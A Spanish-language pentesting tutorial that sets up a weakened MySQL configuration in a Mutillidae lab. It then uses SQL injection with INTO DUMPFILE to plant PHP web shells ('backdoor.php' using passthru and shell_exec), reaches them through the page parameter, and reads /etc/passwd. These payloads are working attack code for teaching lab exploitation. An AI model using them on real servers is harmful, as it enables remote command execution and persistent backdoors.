# WebShells

Las `WebShells` no es una vulnerabilidad como tal, si no que es un `script` un fragmento de codigo que vamos a injectar en la maquina que esta alojando la aplicacion web de manera que nosotros podamos ganar persistencia en esa maquina, como la ejeccion remota de comandos, etc... Una `WebShell` seria el `payload` (Transladandolo a esos coneptos en los que hablabamos en la explotacion de vulnerabilidades en `hosts`) aprovechando una vulnerabilidad de manera que nosotros podamos injectar ese codigo dejar ese ficherito en el web server y despues poder ejecutar comandos remotamente, ganar persistencia, etc...

La tipica `WebShell` que se suele crear en un fichero seria la siguiente:

```php
<?php echo passthru($_GET['cmd']); ?>
```

Es un codigo en `PHP` que lo unico que hace es recivir un comando/parametro en este caso mediante la URL con la condicion `GET` y lo que hace es que ejecuta ese comando en el sistema operativo de la maquina en la que este alojando este fichero, si conseguimos subir este fichero al web server y accedemos a el mediante la URL y metemos como parametro el llamado `cmd` el cual le pusimos en el fichero seguido de un comando del sistema como `ls, cat, etc...` se nos va a ejecutar en el sistema y nos mostrara la informacion por pantalla.

Muchas veces las organizaciones en vez de tener limitada la lectura de ficheros mediante `mysql` la deslimitan para que pueda tener mas funcionalidades y a causa de esto, nosotros como atacantes podemos aprovechar eso, por lo que vamos a simularlo, haciendo los siguientes cambios en la maquina `ubuntu`.

Abrimos el siguiente archivo mediante la terminal:

```shell
nano /etc/mysql/mysql.conf.d/mysqld.cnf

#Dentro del nano
[mysqld]

secure-file-priv = ""
```

Y añadimos esa linea debajo de `[mysqld]`.

Ahora nos vamos a la siguiente direccion:

```shell
cd /var/www/html
chown -R mysql:mysql mutillidae
chown -R mysql:mysql mutillidae/*
```

Y le damos permisos a `mysql` para la pagina de `mutillidae`.

Despues una vez echo esto, lo que hemos permitido es que la base de datos pueda leer cualquier fichero del servidor, cosa muy habitual en empresas o demas organizaciones, incluso en muchas de ellas vienen por defecto.

Por lo que vamos a escribir con esta vulnerabilidad un `WebShell` y despues con la tecnica del `Path Traversal` vamos acceder a el.

Vamos a irnos en la pagina de `Mutillidae` a cualquier campo que tenga la vulnerabilidad de `SQL Injection` y vamos a escribir la siguiente sentencia:

```
User: ' UNION select null,null,null,null,null,null,null,null,null,'<?php echo passthru($_GET["cmd"]); ?>' INTO DUMPFILE '../../../../../var/www/html/mutillidae/src/backdoor.php'-- -
Pass: null
```

Lo que estamos haciendo aqui es que esa `WebShell` de `PHP` la estamos volcando con `INTO DUMPFILE` a un fichero con la siguiente ruta mostrada y lo llamaremos al archivo `backdoor.php`.

Pero para hacerlo mejor, pondremos el siguiente `WebShell` mas que uno simple:

```
User: ' UNION select null,null,null,null,null,null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '../../../../../var/www/html/mutillidae/src/backdoor.php'-- -
Pass: null
```

Hace el mismo funcionamiento que el anterior, pero es mejorado, que esto lo tendremos en la ayuda de la propia pagina de `Mutillidae`.

Y con esto ya tendriamos el fichero subido en la pagina.

Y ahora utilizando la tecnica de `Path Traversal` haremos lo siguiente para meternos en dicho fichero:

```
URL = http://<IP>/mutillidae/src/index.php?page=backdoor.php
```

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

Nos aparecera como un recuadro en el que podremos insertar un comando que se ejecutara en el sistema.

Si por ejemplo queremos ver el archivo de `passwd` pondremos `cat /etc/passwd`:

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

Y podremos verlo en la propia pagina.
